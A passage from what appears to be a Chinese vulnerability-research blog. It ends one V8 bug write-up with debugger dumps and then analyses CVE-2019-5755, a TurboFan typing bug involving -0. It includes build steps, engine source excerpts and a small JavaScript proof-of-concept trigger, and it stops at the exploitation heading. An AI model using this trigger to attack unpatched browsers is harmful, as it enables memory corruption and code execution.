std::__1::tuple&lt;&gt;&amp;&amp;) (this=0x559480f98fc8, __k=@0x7ffd622fe4c8: 22, __args=..., __args=..., __args=...) at ../../buildtools/third_party/libc++/trunk/include/__hash_table:2010       </span><br><span class="line">2010                <span class="keyword">for</span> (__nd = __nd-&gt;__next_; __nd != nullptr &amp;&amp;</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0xdeadbeef</span><br><span class="line"> RBX  0x7f1804602220 ◂— push   rbp</span><br><span class="line"> RCX  0x559480f98fc8 —▸ 0x559480ff5c50 ◂— 0xdeadbeef</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x7ffd622fe4c8 ◂— 0x16</span><br><span class="line"> RSI  0x16</span><br><span class="line"> R8   0x559480f99020 ◂— 0x1</span><br><span class="line"> R9   0x10</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x7f1802ecaca0 (main_arena+96) —▸ 0x559481034310 ◂— 0x0</span><br><span class="line"> R12  0xffffffffffffffff</span><br><span class="line"> R13  0x559480f8efb8 —▸ 0xba4cbf82ba9 ◂— 0xba4cbf822</span><br><span class="line"> R14  0x5</span><br><span class="line"> R15  0x7ffd622ffc08 —▸ 0x1d3adb982e39 ◂— 0xb10000254d0fb8ae</span><br><span class="line"> RBP  0x7ffd622fe480 —▸ 0x7ffd622fe560 —▸ 0x7ffd622fe590 —▸ 0x7ffd622fe5c0 —▸ 0x7ffd622fe5f0 ◂— ...</span><br><span class="line"> RSP  0x7ffd622fdd60 —▸ 0x7ffd622fdf90 ◂— 0x0</span><br><span class="line"> RIP  0x7f180468f76b ◂— mov    rax, qword ptr [rax]</span><br><span class="line">───────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7f180468f76b    mov    rax, qword ptr [rax]</span><br><span class="line">   0x7f180468f76e    mov    qword ptr [rbp - 0x598], rax</span><br><span class="line">   0x7f180468f775    xor    eax, eax</span><br><span class="line">   0x7f180468f777    mov    cl, al</span><br><span class="line">   0x7f180468f779    cmp    qword ptr [rbp - 0x598], 0</span><br><span class="line">   0x7f180468f781    mov    byte ptr [rbp - 0x689], cl</span><br><span class="line">   0x7f180468f787    je     0x7f180468f88e &lt;0x7f180468f88e&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f180468f88e    mov    al, byte ptr [rbp - 0x689]</span><br><span class="line">   0x7f180468f894    <span class="built_in">test</span>   al, 1</span><br><span class="line">   0x7f180468f896    jne    0x7f180468f8a1 &lt;0x7f180468f8a1&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f180468f8a1    mov    rax, qword ptr [rbp - 0x678]</span><br><span class="line">───────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────</span><br><span class="line">In file: /usr/class/v8/v8/buildtools/third_party/libc++/trunk/include/__hash_table</span><br><span class="line">   2005     &#123;</span><br><span class="line">   2006         __chash = __constrain_hash(__hash, __bc);</span><br><span class="line">   2007         __nd = __bucket_list_[__chash];</span><br><span class="line">   2008         <span class="keyword">if</span> (__nd != nullptr)</span><br><span class="line">   2009         &#123;</span><br><span class="line"> ► 2010             <span class="keyword">for</span> (__nd = __nd-&gt;__next_; __nd != nullptr &amp;&amp;</span><br><span class="line">   2011                 (__nd-&gt;__hash() == __hash || __constrain_hash(__nd-&gt;__hash(), __bc) == __chash);</span><br><span class="line">   2012                                                            __nd = __nd-&gt;__next_)</span><br><span class="line">   2013             &#123;</span><br><span class="line">   2014                 <span class="keyword">if</span> (key_eq()(__nd-&gt;__upcast()-&gt;__value_, __k))</span><br><span class="line">   2015                     goto __done;</span><br><span class="line">───────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffd622fdd60 —▸ 0x7ffd622fdf90 ◂— 0x0</span><br><span class="line">01:0008│      0x7ffd622fdd68 —▸ 0x559481012378 —▸ 0x559481012310 —▸ 0x7f18058b3d60 —▸ 0x7f180483bc10 (v8::internal::Sweeper::IncrementalSweeperTask::~IncrementalSweeperTask()) ◂— ...                                                                                          </span><br><span class="line">02:0010│      0x7ffd622fdd70 ◂— 0x0</span><br><span class="line">03:0018│      0x7ffd622fdd78 —▸ 0x7ffd622fe450 —▸ 0x559480f99020 ◂— 0x1</span><br><span class="line">04:0020│      0x7ffd622fdd80 ◂— 9 /* <span class="string">'\t'</span> */</span><br><span class="line">... ↓</span><br><span class="line">06:0030│      0x7ffd622fdd90 —▸ 0x559481012360 —▸ 0x5594810122e0 —▸ 0x559480fd85d0 —▸ 0x559480ff43e0 ◂— ...</span><br><span class="line">07:0038│      0x7ffd622fdd98 —▸ 0x559480fe96d0 —▸ 0x559480fe9700 ◂— 0x0</span><br><span class="line">─────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7f180468f76b</span><br><span class="line">   f 1     7f180468f76b</span><br><span class="line">   f 2     7f180468e086 v8::internal::CancelableTaskManager::Register(v8::internal::Cancelable*)+502</span><br><span class="line">   f 3     7f180468de7a v8::internal::Cancelable::Cancelable(v8::internal::CancelableTaskManager*)+106</span><br><span class="line">   f 4     7f180468f237 v8::internal::CancelableTask::CancelableTask(v8::internal::CancelableTaskManager*)+39</span><br><span class="line">   f 5     7f180468f200 v8::internal::CancelableTask::CancelableTask(v8::internal::Isolate*)+48</span><br><span class="line">   f 6     7f1804d79983</span><br><span class="line">   f 7     7f1804d71c98</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="五、后记">五、后记</h2>
<p>该漏洞的<a href="https://chromium.googlesource.com/v8/v8.git/+/7d47839dc062b69467f58c55aab7cc9abf78d687" target="_blank" rel="noopener">补丁</a>非常简单：将调用 ToBigInt 函数的那一行语句，提至条件判断语句之前。这样就可以使 user JS callback 导致的 Neutered 也被 if 条件判断给捕获。</p>
<h2 id="六、参考">六、参考</h2>
<ul>
<li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=867776" target="_blank" rel="noopener">Issue 867776: V8 OOB write BigInt64Array.of and BigInt64Array.from side effect neuter</a></li>
</ul>
]]></content>
      <categories>
        <category>vulnerability analysis</category>
        <category>v8</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-5755 分析</title>
    <url>/2021/02/CVE-2019-5755/</url>
    <content><![CDATA[<h2 id="一、前言">一、前言</h2>
<ul>
<li>
<p>CVE-2019-5755 是一个位于 v8 turboFan 的类型信息缺失漏洞。该漏洞将导致 SpeculativeSafeIntegerSubtract 的计算结果缺失 MinusZero （即 -0）这种类型。这将允许 turboFan 计算出错误的 Range 并可进一步构造出越界读写原语，乃至执行 shellcode。</p>
</li>
<li>
<p>复现用的 v8 版本为 <code>7.1.302.28</code> （或者commit ID <code>a62e9dd69957d9b1d0a56f825506408960a283fc</code> 前的版本也可）</p>
</li>
</ul>
<a id="more"></a>
<h2 id="二、环境搭建">二、环境搭建</h2>
<ul>
<li>
<p>切换 v8 版本，然后编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 7.1.302.28</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>启动 turbolizer。如果原先版本的 turbolizer 无法使用，则可以使用在线版本的 <a href="https://v8.github.io/tools/head/turbolizer/index.html" target="_blank" rel="noopener">turbolizer</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tools/turbolizer</span><br><span class="line">npm i</span><br><span class="line">npm run-script build</span><br><span class="line">python -m SimpleHTTPServer 8000&amp;</span><br><span class="line">google-chrome http://127.0.0.1:8000</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="三、漏洞细节">三、漏洞细节</h2>
<ul>
<li>
<p>turboFan 的 Typer 将 SpeculativeSafeIntegerSubtract 的类型设置为与 kSafeInteger 的交集，<strong>但这里没有考虑到 <code>-0</code> （即 MinusZero）的情况。</strong> 例如：算式 <code>((-0) - 0)</code> 应该返回 <code>-0</code>，但是由于 Typer 取的是两 个类型的交集，因此 typer 将忽略 MinusZero (-0) 的这种情况。而这种 wrong case 可以用来执行错误的范围计算。</p>
<p>以下是 SpeculativeSafeIntegerSubtract 函数（漏洞函数）以及 SpeculativeSafeIntegerAdd 函数（对照函数）的源码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::SpeculativeSafeIntegerAdd</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  Type result = SpeculativeNumberAdd(lhs, rhs);</span><br><span class="line">  <span class="comment">// If we have a Smi or Int32 feedback, the representation selection will</span></span><br><span class="line">  <span class="comment">// either truncate or it will check the inputs (i.e., deopt if not int32).</span></span><br><span class="line">  <span class="comment">// In either case the result will be in the safe integer range, so we</span></span><br><span class="line">  <span class="comment">// can bake in the type here. This needs to be in sync with</span></span><br><span class="line">  <span class="comment">// SimplifiedLowering::VisitSpeculativeAdditiveOp.</span></span><br><span class="line">  <span class="keyword">return</span> Type::Intersect(result, cache_.kSafeIntegerOrMinusZero, zone());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::SpeculativeSafeIntegerSubtract</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  Type result = SpeculativeNumberSubtract(lhs, rhs);</span><br><span class="line">  <span class="comment">// If we have a Smi or Int32 feedback, the representation selection will</span></span><br><span class="line">  <span class="comment">// either truncate or it will check the inputs (i.e., deopt if not int32).</span></span><br><span class="line">  <span class="comment">// In either case the result will be in the safe integer range, so we</span></span><br><span class="line">  <span class="comment">// can bake in the type here. This needs to be in sync with</span></span><br><span class="line">  <span class="comment">// SimplifiedLowering::VisitSpeculativeAdditiveOp.</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">    给左右操作数相减的结果（即变量 result）与 `kSafeInteger`类型 相交，返回 **交集** 。</span></span><br><span class="line"><span class="comment">    !!! 注意这里，使用的是 cache_.kSafeInteger</span></span><br><span class="line"><span class="comment">    与上面SpeculativeSafeIntegerAdd函数使用的cache_.kSafeIntegerOrMinusZero不一致</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">return</span> result = Type::Intersect(result, cache_.kSafeInteger, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下是该漏洞的 PoC：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">trigger</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> idx = <span class="built_in">Object</span>.is((trigger ? <span class="number">-0</span> : <span class="number">0</span>) - <span class="number">0</span>, <span class="number">-0</span>);</span><br><span class="line">    <span class="keyword">return</span> idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">false</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">true</span>)); <span class="comment">// expected: true, got: false</span></span><br></pre></td></tr></table></figure>
<p>正常来说，<code>foo(true)</code>应该始终返回 true （因为 $-0 - 0 = -0$），但优化后产生的结果却是 false。</p>
<p>我们可以观察一下 turbolizer 中的信息：</p>
<p><img src="/2021/02/CVE-2019-5755/poc_turbolizer.png" alt="img"></p>
<p>可以看到，对于 $${MinusZero | Range(0,0)} - Range(0,0)$$ 这种情况，SpeculativeSafeIntegerSubtract 的 Type 中并没有 MinusZero 这种类型。</p>
<p>因此，turboFan 将始终在 <code>TypedLoweringPhase - TypedOptimization::ReduceSameValue</code>中，把SameValue 结点优化成 false，因为 $MinusZero \ne Range(0, 0)$。</p>
<p><img src="/2021/02/CVE-2019-5755/samevalue_turbolizer.png" alt="img"></p>
</li>
<li>
<p>SameValue 结点是通过 JS 中<code>Object.is</code> 函数调用来生成的，其目的是用于判断左右操作数是否相同。</p>
<p>具体来说是通过以下调用链生成：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InliningPhase::Run</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">    Reduction <span class="title">JSCallReducer::ReduceJSCall</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">      Reduction <span class="title">JSCallReducer::ReduceObjectIs</span><span class="params">(Node* node)</span></span></span><br></pre></td></tr></table></figure>
<p>其中，函数 ReduceObjectIs 的源码如下:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES section #sec-object.is</span></span><br><span class="line"><span class="function">Reduction <span class="title">JSCallReducer::ReduceObjectIs</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(IrOpcode::kJSCall, node-&gt;opcode());</span><br><span class="line">  CallParameters <span class="keyword">const</span>&amp; params = CallParametersOf(node-&gt;op());</span><br><span class="line">  <span class="keyword">int</span> <span class="keyword">const</span> argc = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(params.arity() - <span class="number">2</span>);</span><br><span class="line">  Node* lhs = (argc &gt;= <span class="number">1</span>) ? NodeProperties::GetValueInput(node, <span class="number">2</span>)</span><br><span class="line">                          : jsgraph()-&gt;UndefinedConstant();</span><br><span class="line">  Node* rhs = (argc &gt;= <span class="number">2</span>) ? NodeProperties::GetValueInput(node, <span class="number">3</span>)</span><br><span class="line">                          : jsgraph()-&gt;UndefinedConstant();</span><br><span class="line">  <span class="comment">// 生成 SameValue Node</span></span><br><span class="line">  Node* value = graph()-&gt;NewNode(simplified()-&gt;SameValue(), lhs, rhs);</span><br><span class="line">  ReplaceWithValue(node, value);</span><br><span class="line">  <span class="keyword">return</span> Replace(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Typer 将在 TyperPhase 阶段试着计算出 SameValue 结点的类型，它将沿着以下调用链</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Type Typer::Visitor::TypeSameValue(Node* node)</span><br><span class="line">  Type Typer::Visitor::SameValueTyper(Type lhs, Type rhs, Typer* t)</span><br><span class="line">    <span class="function">Type <span class="title">OperationTyper::SameValue</span><span class="params">(Type lhs, Type rhs)</span></span></span><br></pre></td></tr></table></figure>
<p>调用到<code>OperationTyper::SameValue</code>函数并计算其类型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::SameValue</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!JSType(lhs).Maybe(JSType(rhs))) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  <span class="keyword">if</span> (lhs.Is(Type::NaN())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (rhs.Is(Type::NaN())) <span class="keyword">return</span> singleton_true();</span><br><span class="line">    <span class="keyword">if</span> (!rhs.Maybe(Type::NaN())) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs.Is(Type::NaN())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!lhs.Maybe(Type::NaN())) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lhs.Is(Type::MinusZero())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (rhs.Is(Type::MinusZero())) <span class="keyword">return</span> singleton_true();</span><br><span class="line">    <span class="keyword">if</span> (!rhs.Maybe(Type::MinusZero())) <span class="keyword">return</span> singleton_false();</span><br><span class="line">   <span class="comment">// 如果左右操作数不同时为 MinusZero，则返回 false。</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs.Is(Type::MinusZero())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!lhs.Maybe(Type::MinusZero())) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lhs.Is(Type::OrderedNumber()) &amp;&amp; rhs.Is(Type::OrderedNumber()) &amp;&amp;</span><br><span class="line">      (lhs.Max() &lt; rhs.Min() || lhs.Min() &gt; rhs.Max())) &#123;</span><br><span class="line">    <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Boolean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当 SameValue 结点计算出 确定性的类型（即 true / false）后，turboFan 将在 TypedLoweringPhase 阶段中的 ConstantFoldingReducer 对 SameValue 进行结点替换，用之前计算出的 HeapConstant 替换当前的 SameValue 结点：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">ConstantFoldingReducer::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line"><span class="comment">// Check if the output type is a singleton.  In that case we already know the</span></span><br><span class="line">  <span class="comment">// result value and can simply replace the node if it's eliminable.</span></span><br><span class="line">  <span class="comment">// 如果当前结点的 type 是 singleton，即确定只有一种类型，则开始优化</span></span><br><span class="line">  <span class="keyword">if</span> (!NodeProperties::IsConstant(node) &amp;&amp; NodeProperties::IsTyped(node) &amp;&amp;</span><br><span class="line">      node-&gt;op()-&gt;HasProperty(Operator::kEliminatable)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// We can only constant-fold nodes here, that are known to not cause any</span></span><br><span class="line">    <span class="comment">// side-effect, may it be a JavaScript observable side-effect or a possible</span></span><br><span class="line">    <span class="comment">// eager deoptimization exit (i.e. &#123;node&#125; has an operator that doesn't have</span></span><br><span class="line">    <span class="comment">// the Operator::kNoDeopt property).</span></span><br><span class="line">    <span class="comment">// 获取当前结点的类型</span></span><br><span class="line">    Type upper = NodeProperties::GetType(node);</span><br><span class="line">    <span class="keyword">if</span> (!upper.IsNone()) &#123;</span><br><span class="line">      Node* replacement = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="comment">// 如果当前结点是 HeapConstant</span></span><br><span class="line">      <span class="keyword">if</span> (upper.IsHeapConstant()) &#123;</span><br><span class="line">        replacement = jsgraph()-&gt;Constant(upper.AsHeapConstant()-&gt;Ref());</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="comment">// ...</span></span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> (replacement) &#123;</span><br><span class="line">        <span class="comment">// Make sure the node has a type.</span></span><br><span class="line">        <span class="comment">// 使用新类型进行替换</span></span><br><span class="line">        <span class="keyword">if</span> (!NodeProperties::IsTyped(replacement)) &#123;</span><br><span class="line">          NodeProperties::SetType(replacement, upper);</span><br><span class="line">        &#125;</span><br><span class="line">        ReplaceWithValue(node, replacement);</span><br><span class="line">        <span class="keyword">return</span> Changed(replacement);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若 SameValue 无法得到确定性的类型，则将在 TypedLoweringPhase  中通过 <code>TypedOptimization::ReduceSameValue</code> 函数进行另一种优化。以下是该函数的源码，在该源码中我们可以了解到 ReduceSameValue 的详细执行过程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">TypedOptimization::ReduceSameValue</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(IrOpcode::kSameValue, node-&gt;opcode());</span><br><span class="line">  Node* <span class="keyword">const</span> lhs = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">  Node* <span class="keyword">const</span> rhs = NodeProperties::GetValueInput(node, <span class="number">1</span>);</span><br><span class="line">  Type <span class="keyword">const</span> lhs_type = NodeProperties::GetType(lhs);</span><br><span class="line">  Type <span class="keyword">const</span> rhs_type = NodeProperties::GetType(rhs);</span><br><span class="line">  <span class="keyword">if</span> (lhs == rhs) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,x) =&gt; #true</span></span><br><span class="line">    <span class="keyword">return</span> Replace(jsgraph()-&gt;TrueConstant());</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.Is(Type::Unique()) &amp;&amp; rhs_type.Is(Type::Unique())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:unique,y:unique) =&gt; ReferenceEqual(x,y)</span></span><br><span class="line">    NodeProperties::ChangeOp(node, simplified()-&gt;ReferenceEqual());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.Is(Type::String()) &amp;&amp; rhs_type.Is(Type::String())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:string,y:string) =&gt; StringEqual(x,y)</span></span><br><span class="line">    NodeProperties::ChangeOp(node, simplified()-&gt;StringEqual());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.Is(Type::MinusZero())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:minus-zero,y) =&gt; ObjectIsMinusZero(y)</span></span><br><span class="line">    node-&gt;RemoveInput(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::ChangeOp(node, simplified()-&gt;ObjectIsMinusZero());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.Is(Type::MinusZero())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:minus-zero) =&gt; ObjectIsMinusZero(x)</span></span><br><span class="line">    node-&gt;RemoveInput(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::ChangeOp(node, simplified()-&gt;ObjectIsMinusZero());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.Is(Type::NaN())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:nan,y) =&gt; ObjectIsNaN(y)</span></span><br><span class="line">    node-&gt;RemoveInput(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::ChangeOp(node, simplified()-&gt;ObjectIsNaN());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.Is(Type::NaN())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:nan) =&gt; ObjectIsNaN(x)</span></span><br><span class="line">    node-&gt;RemoveInput(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::ChangeOp(node, simplified()-&gt;ObjectIsNaN());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.Is(Type::PlainNumber()) &amp;&amp;</span><br><span class="line">             rhs_type.Is(Type::PlainNumber())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:plain-number,y:plain-number) =&gt; NumberEqual(x,y)</span></span><br><span class="line">    NodeProperties::ChangeOp(node, simplified()-&gt;NumberEqual());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>我们再简单了解一下 SpeculativeSafeIntegerSubtract 和 SpeculativeNumberSubtract 结点的生成方式。这两种结点的生成都将通过以下调用链：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::CreateGraph</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  <span class="keyword">void</span> <span class="title">GraphBuilderPhase::Run</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::CreateGraph</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitBytecodes</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitSingleBytecode</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitSubSmi</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildBinaryOpWithImmediate</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildBinaryOp</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">                <span class="title">BytecodeGraphBuilder::TryBuildSimplifiedBinaryOp</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">                  JSTypeHintLowering::LoweringResult <span class="title">JSTypeHintLowering::ReduceBinaryOperation</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">                    Node* <span class="title">TryBuildNumberBinop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                      <span class="keyword">const</span> Operator* <span class="title">SpeculativeNumberOp</span><span class="params">(NumberOperationHint hint)</span></span></span><br></pre></td></tr></table></figure>
<p>调用到最终的目标函数 <code>SpeculativeNumberOp</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Operator* <span class="title">SpeculativeNumberOp</span><span class="params">(NumberOperationHint hint)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (op_-&gt;opcode()) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">case</span> IrOpcode::kJSSubtract:</span><br><span class="line">        <span class="keyword">if</span> (hint == NumberOperationHint::kSignedSmall ||</span><br><span class="line">            hint == NumberOperationHint::kSigned32) &#123;</span><br><span class="line">          <span class="keyword">return</span> simplified()-&gt;SpeculativeSafeIntegerSubtract(hint);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> simplified()-&gt;SpeculativeNumberSubtract(hint);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    UNREACHABLE();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>在 TryBuildNumberBinop 函数中，turboFan 试图从 feedback_vector 中获取操作数的相关信息。操作数信息一共有以下五种类型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A hint for speculative number operations.</span></span><br><span class="line"><span class="keyword">enum</span> <span class="class"><span class="keyword">class</span> <span class="title">NumberOperationHint</span> :</span> <span class="keyword">uint8_t</span> &#123;</span><br><span class="line">  kSignedSmall,        <span class="comment">// Inputs were Smi, output was in Smi.</span></span><br><span class="line">  kSignedSmallInputs,  <span class="comment">// Inputs were Smi, output was Number.</span></span><br><span class="line">  kSigned32,           <span class="comment">// Inputs were Signed32, output was Number.</span></span><br><span class="line">  kNumber,             <span class="comment">// Inputs were Number, output was Number.</span></span><br><span class="line">  kNumberOrOddball,    <span class="comment">// Inputs were Number or Oddball, output was Number.</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当且仅当操作数类型为 <code>NumberOperationHint::kSignedSmall</code> 或 <code>NumberOperationHint::kSigned32</code>时，当前减法才会被视为是 Safe 的，因此创建 SpeculativeSafeIntegerSubtract 结点；否则创建保守的 SpeculativeNumberSubtract 结点。</p>
</li>
<li>
<p>最后附带说明一下<strong>部分数字类型的范围</strong>：</p>
<blockquote>
<p>参照源码 src/compiler/types.h</p>
</blockquote>
<ul>
<li>
<p>一些基础类型</p>
<ul>
<li>OtherNumber（ON）：$(-\infty, -2^{31}) \cup [2^{32}, \infty)$</li>
<li>OtherSigned32（OS32） ：$[-2^{31}, -2^{30})$</li>
<li>Negative31（N31）：$[-2^{30}, 0)$</li>
<li>Unsigned30（U30）: $[0, 2^{30})$</li>
<li>OtherUnsigned31（OU31）: $[2^{30}, 2^{31})$</li>
<li>OtherUnsigned32（OU32）: $[2^{31}, 2^{32})$</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  ON    OS32     N31     U30     OU31    OU32     ON</span><br><span class="line">______[_______[_______[_______[_______[_______[_______</span><br><span class="line">    <span class="number">-2</span>^<span class="number">31</span>   <span class="number">-2</span>^<span class="number">30</span>     <span class="number">0</span>      <span class="number">2</span>^<span class="number">30</span>    <span class="number">2</span>^<span class="number">31</span>    <span class="number">2</span>^<span class="number">32</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>Integral32：$[-2^{31}, 2^{32})$</p>
</li>
<li>
<p>PlainNumber：任何浮点数，不包括 $-0$</p>
</li>
<li>
<p>Number：任何浮点数，包括 $-0$、$NaN$</p>
</li>
<li>
<p>Numeric：任何浮点数，包括 $-0$、$NaN$ 以及 $BigInt$</p>
</li>
</ul>
<h2 id="四、漏洞利用">四、漏洞利用</h2>
